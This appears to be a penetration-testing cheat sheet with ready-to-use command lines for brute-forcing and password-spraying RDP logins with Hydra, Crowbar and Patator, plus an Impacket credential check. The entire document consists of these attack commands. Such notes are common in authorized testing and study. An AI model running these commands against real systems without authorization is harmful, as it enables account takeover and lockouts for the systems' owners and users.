# RDP

## 01 - Hydra

`$ hydra -U rdp`

`$ hydra -l <username> -p <password> rdp://<IP>/<domain_name>`

## 02 - Crowbar

`$ crowbar -b rdp -s <IP> -u <username> -C passwords.lst -n 1`

`$ crowbar -b rdp -U users.lst -C passwords.lst -s <IP>/<CIDR>`

## 03 - Patator

`$ patator rdp login host=<IP> user=<username> password=FILE0 0=passwords.lst -x ignore:fgrep='ERRCONNECT_LOGON_FAILURE'`

## 03 - Impacket

`$ rdp_check.py <domain_name>/<username>:<password>@<IP>`